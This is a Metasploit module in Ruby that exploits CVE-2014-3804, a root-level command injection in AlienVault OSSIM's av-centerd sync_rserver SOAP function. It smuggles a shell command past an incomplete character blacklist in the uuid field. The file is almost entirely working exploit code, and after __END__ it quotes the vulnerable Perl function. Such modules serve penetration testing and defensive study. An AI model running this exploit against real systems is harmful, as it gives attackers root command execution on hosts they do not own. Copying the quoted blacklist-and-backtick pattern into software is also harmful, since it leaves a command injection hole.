require 'msf/core'

class MetasploitModule < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'        => 'Alienvault OSSIM av-centerd Util.pm sync_rserver Command Execution',
			'Description' => %q{
				This module exploits a command injection vulnerability found within the sync_rserver
				function in Util.pm. The vulnerability is triggered due to an incomplete blacklist
				during the parsing of the $uuid parameter. This allows for the escaping of a system
				command allowing for arbitrary command execution as root
			},
			'References'  =>
			[
				[ 'CVE', '2014-3804' ],
				[ 'ZDI', '14-197' ],
				[ 'URL', 'http://forums.alienvault.com/discussion/2690' ],
			],
			'Author'      => [ 'james fitts' ],
			'License'     => MSF_LICENSE,
			'DisclosureDate' => 'Jun 11 2014')

		register_options([
			Opt::RPORT(40007),
			OptBool.new('SSL',   [true, 'Use SSL', true]),
			OptString.new('CMD', [ false, 'This is the file to download', 'touch /tmp/file.txt'])
		], self.class)
	
	end

	def run

		soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
		soap += "<soap:Envelope xmlns:soap=\"http:\/\/schemas.xmlsoap.org/soap/envelope/\"\r\n"
		soap += "xmlns:soapenc=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding/\" xmlns:xsd=\"http:\/\/www.w3.org\/2001\/XMLSchema\"\r\n"
		soap += "xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\"\r\n"
		soap += "soap:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\">\r\n"
		soap += "<soap:Body>\r\n"
		soap += "<sync_rserver xmlns=\"AV\/CC\/Util\">\r\n"
		soap += "<c-gensym3 xsi:type=\"xsd:string\">All</c-gensym3>\r\n"
		soap += "<c-gensym5 xsi:type=\"xsd:string\">&amp; #{datastore['CMD']} </c-gensym5>\r\n"
		soap += "<c-gensym7 xsi:type=\"xsd:string\">#{datastore['RHOST']}</c-gensym7>\r\n"
		soap += "<c-gensym9 xsi:type=\"xsd:string\">#{Rex::Text.rand_text_alpha(4 + rand(4))}</c-gensym9>\r\n"
		soap += "</sync_rserver>\r\n"
		soap += "</soap:Body>\r\n"
		soap += "</soap:Envelope>\r\n"

		res = send_request_cgi(
			{
				'uri'	=>	'/av-centerd',
				'method'	=>	'POST',
				'ctype'		=>	'text/xml; charset=UTF-8',
				'data'		=>	soap,
				'headers'	=>	{
					'SOAPAction'	=>	"\"AV/CC/Util#sync_rserver\""
				}
			}, 20)

		if res && res.code == 200
			print_good("Command executed successfully!")
		else
			print_bad("Something went wrong...")
		end

	end

end
__END__

/usr/share/alienvault-center/lib/AV/CC/Util.pm

sub sync_rserver
{
    my ( $funcion_llamada, $nombre, $uuid, $admin_ip, $hostname ) = @_;
    verbose_log_file(
        "SYNC RSERVER TASK : Received call from $uuid : ip source = $admin_ip, hostname = $hostname:($funcion_llamada,$nombre)"
    );

    if ($uuid =~  /[;`\$\<\>\|]/) {
        console_log_file("Not allowed uuid: $uuid in sync_rserver\n");
        my @ret = ("Error");
        return \@ret;
    }

    my $conn = Avtools::get_database();
    my $sqlfile = "/tmp/sync_${uuid}.sql";
    my $sqlfile_old = "/tmp/sync_${uuid}.sql.old";
    my $sqlfile_md5 = `md5sum $sqlfile | awk '{print \$1}'`;
    my $sqlfile_content;
    my $status = 1;
    my $counter = 0;
    my @ret;
    my $query = qq{};
    my $dbq;

    if ( -f $sqlfile_old )
    {
        my $sqlfile_old_md5 = `md5sum $sqlfile_old | awk '{print \$1}'`;
        debug_log_file ("Old MD5: $sqlfile_old_md5 New MD5: $sqlfile_md5");
        if ( $sqlfile_md5 eq $sqlfile_old_md5 )
        {
            unlink $sqlfile;
            verbose_log_file ("Already sync'ed!");
            return "0";
        }
        else
        {
            unlink $sqlfile_old;
        }
    }

    my $query_array = `ossim-db < $sqlfile 2>&1`;
    $query_array =~ s/[\s\n]+$//g;
    if ($query_array ne '')
    {
        $status = $query_array;
    }
    else
    {
        $status = 0;
    }

    if ( ! (defined $status) or $status == 0 )
    {
        if ( grep /RESTART\sOSSIM\-SERVER/, $sqlfile )
        {
            verbose_log_file("RESTART OSSIM-SERVER MARK found. Restarting ossim-server");
            system('/etc/init.d/ossim-server restart');
        }
        else
        {
            debug_log_file("RESTART OSSIM-SERVER MARK not found. Skipping ossim-server restart");
        }

        $query = qq{REPLACE INTO alienvault.config (conf, value) VALUES ('latest_asset_change', utc_timestamp())};
        debug_log_file($query);
        $dbq = $conn->prepare($query);
        $dbq->execute();
        $dbq->finish();
    }
    else
    {
        verbose_log_file ("Error syncing rservers: ${status}");
    }

    debug_log_file("Move file: $sqlfile");
    move ($sqlfile, $sqlfile . ".old");

#    push @ret, "0";
    return "0";
}
